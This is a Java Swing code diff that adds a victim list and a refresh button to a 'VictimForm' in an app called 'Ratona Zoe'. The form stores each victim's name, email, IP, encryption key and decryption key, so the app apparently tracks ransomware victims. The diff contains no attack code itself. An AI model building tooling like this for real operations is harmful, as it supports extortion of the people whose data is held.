@@ -15,9 +15,11 @@ public class VictimForm extends JFrame {
     private JPanel panel;
     private JButton registerJButton;
     private JButton backJButton;
-
+    private JList victimsJList;
+    private JButton getVictimsJButton;
     private MenuForm menuForm;
 
+    private DefaultListModel listModel;
     public VictimForm(MenuForm menuForm){
         super("Ratona Zoe");
 
@@ -27,7 +29,10 @@ public class VictimForm extends JFrame {
         pack();
         panel.setBorder(BorderFactory.createEmptyBorder(10, 20, 10, 20));
 
+        this.listModel = new DefaultListModel();
         this.menuForm = menuForm;
+        victimsJList.setModel(listModel);
+
 
         backJButton.addActionListener(new ActionListener() {
             @Override
@@ -40,6 +45,13 @@ public class VictimForm extends JFrame {
             @Override
             public void actionPerformed(ActionEvent e) {
                 registerVictim();
+                fillList();
+            }
+        });
+        getVictimsJButton.addActionListener(new ActionListener() {
+            @Override
+            public void actionPerformed(ActionEvent e) {
+                fillList();
             }
         });
     }
@@ -49,7 +61,7 @@ public class VictimForm extends JFrame {
         this.menuForm.setVisible(true);
     }
 
-    public void registerVictim () {
+    private void registerVictim () {
         String name = victimNameJText.getText().trim();
         String email = victimEmailJText.getText().trim();
         String ip = victimIpJText.getText().trim();
@@ -74,11 +86,19 @@ public class VictimForm extends JFrame {
         }
     }
 
-    public void cleanInputs () {
+    private void cleanInputs () {
         victimNameJText.setText("");
         victimEmailJText.setText("");
         victimIpJText.setText("");
         encryptedKeyJText.setText("");
         decryptionKeyJText.setText("");
+    }
+
+    private void fillList () {
+        listModel.clear();
+        var victims = menuForm.getVictims();
+        for (Victim victim: victims) {
+            listModel.addElement(victim.getId() + " " + victim.getName());
+        }
     }
 }
